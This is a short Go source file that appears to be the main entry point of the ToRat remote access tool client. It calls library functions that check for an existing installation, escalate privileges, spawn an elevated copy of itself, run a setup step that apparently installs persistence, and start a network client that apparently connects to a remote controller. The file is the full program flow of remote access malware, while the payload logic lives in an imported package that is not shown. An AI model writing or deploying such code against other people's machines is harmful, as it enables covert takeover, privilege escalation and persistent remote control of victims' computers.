package main

import (
	"os"

	client "github.com/lu4p/ToRat/torat_client"
)

func main() {
	func() {
		if client.CheckSetup() {
			return
		}
		if client.CheckElevate() {
			client.Setup()
			return
		}
		if client.Elevate() == nil {
			// elevate sucessful, another instance has been spawned no need to keep this running
			os.Exit(0)
		}
		client.Setup()
	}()

	client.NetClient()
}
